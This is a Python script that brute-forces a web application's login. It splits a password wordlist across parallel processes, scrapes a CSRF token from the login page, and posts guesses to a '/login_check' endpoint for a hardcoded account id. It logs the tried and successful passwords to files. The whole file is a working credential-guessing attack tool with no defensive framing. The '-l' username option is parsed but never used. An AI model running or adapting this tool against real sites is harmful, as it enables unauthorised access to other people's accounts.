import requests
import re
import multiprocessing
import time
from optparse import OptionParser

# Graphics
class color:
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    DARKCYAN = "\033[36m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"
    WHITE = "\33[37m"


# Variables
ims = time.time_ns() // 1_000_000
csrf_token = ""
tried = 0
parser = OptionParser()

# parses
parser.add_option("-l", dest="username", help="Username")
parser.add_option("-P", dest="password", help="Password worldlist")
parser.add_option("-w", dest="URL", help="Target")
parser.add_option("-v", dest="isValid", help="A post-login screen element")
parser.add_option("-r", dest="rate", help="Tries per second")
(cmds, args) = parser.parse_args()

# Brute Vars
URL = cmds.URL
uname = cmds.username
pword = cmds.password
eValid = cmds.isValid
rate = cmds.rate

# Wordlists
file = open(pword, "r")
mainCnt = file.readlines()
l = len(mainCnt)
n = int(l/int(rate))
newCnt = [mainCnt[i : i + n] for i in range(0, len(mainCnt), n)]
valPassFile = open("corrPass.txt", "w")
tPass = open("triedPass.txt", "w")

# Core Function
def bruteforce(url: str, content: str | list[str]):
    global csrf_token, tried
    try:
        session = requests.session()
        if type(content) == str:
            content = [content]  # type: ignore
            bruteforce(url, content)
        else:
            passwords = [x.strip() for x in content]
            for password in passwords:
                login = session.get(f"{url}")
                fStr = '''name="csrf_test_name" value="(.*?)"'''
                reStr = re.search(fStr, login.text)
                if reStr != None:
                    csrf_token = str(reStr.group(1))  # type: ignore
                else:
                    bruteforce(url, password)
                postData = {
                    "csrf_test_name": csrf_token,
                    "id": "22-12687",
                    "password": password,
                    "login": "SIGN IN",
                }
                validation = session.post(f"{url}/login_check", data=postData)
                if eValid in validation.text:
                    print(
                        f"{color.GREEN}[^] Password has been found: {color.WHITE + password}"
                    )
                    valPassFile.write(password)
                    exit()
                elif "Internal Server Error" in validation.text:
                    bruteforce(url, password)
                else:
                    print(f"{color.CYAN}[X] Tried: {color.WHITE}{password}")
                    tPass.write(password + "\n")
                    pass
    except KeyboardInterrupt:
        exit()


# Multiprocessing
class Attack(multiprocessing.Process):
    def __init__(self, wordlist: list[str]):
        super(Attack, self).__init__()
        self.url = URL
        self.wordlist = wordlist

    def run(self):
        try:
            bruteforce(self.url, self.wordlist)
        except KeyboardInterrupt:
            exit("mainM")


if __name__ == "__main__":
    for list in newCnt:
        try:
            Attack(list).start()
        except KeyboardInterrupt:
            exit("ifm")